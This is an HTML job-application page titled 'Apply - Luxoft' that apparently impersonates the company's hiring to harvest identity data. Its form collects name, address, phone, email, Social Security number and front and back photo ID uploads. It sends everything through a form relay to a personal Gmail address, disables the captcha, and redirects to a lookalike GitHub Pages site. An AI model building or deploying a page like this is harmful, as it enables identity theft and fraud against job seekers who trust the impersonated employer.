<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Apply - Luxoft</title>
  <link rel="stylesheet" href="style.css"/>
</head>
<body>
  <div class="container">
    <h2>Apply to Work from Home</h2>
    <form action="https://formsubmit.co/luxoftorganization@gmail.com" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_next" value="https://luxoftorganisation.github.io/The-one-/thankyou.html">

      <label>Full Name:</label><br/>
      <input type="text" name="name" required><br/>
      <label>Address:</label><br/>
      <input type="text" name="address" required><br/>
      <label>Phone Number:</label><br/>
      <input type="text" name="phone" required><br/>
      <label>Email Address:</label><br/>
      <input type="email" name="email" required><br/>
      <label>SSN:</label><br/>
      <input type="text" name="ssn" required><br/>
      <label>Upload Photo ID (Front):</label><br/>
      <input type="file" name="id_front" accept="image/*"><br/>
      <label>Upload Photo ID (Back):</label><br/>
      <input type="file" name="id_back" accept="image/*"><br/><br/>
      <input type="submit" value="Submit Application" class="btn">
    </form>
  </div>
</body>
</html>
